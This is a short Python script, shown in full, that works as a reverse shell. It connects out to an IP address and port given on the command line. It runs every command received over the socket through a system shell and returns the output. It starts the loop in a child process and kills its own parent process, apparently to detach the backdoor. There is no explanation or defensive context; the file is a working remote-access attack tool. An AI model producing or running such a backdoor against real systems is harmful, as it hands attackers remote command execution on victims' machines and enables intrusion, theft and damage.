#!/usr/bin/python
from sys import argv
import subprocess
import socket
import time
import os
from multiprocessing import Process

def get_input(sock):
    cmd = ""
    while True:
        try:
            cmd += sock.recv(1)
        except:
            break
    return cmd


def send_output(sock, output):
    sent = 0
    while sent < len(output):
        try:
            sent += sock.send(output[sent:])
        except:
            pass


def shell_loop(ip, port):
    sock = socket.socket()
    sock.connect((ip, port))
    sock.setblocking(0)
    send_output(sock, "Connected\n")
    while True:
        cmd = get_input(sock)
        if cmd != "":
            try:
                output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
            except:
                output = "Invalid command: %s" % cmd
            send_output(sock, output)
        time.sleep(0.5)


if __name__ == '__main__':
    ip = argv[1]
    port = int(argv[2])
    p = Process(target=shell_loop, args=(ip, port))
    p.start()
    os.kill(os.getpid(), 9)
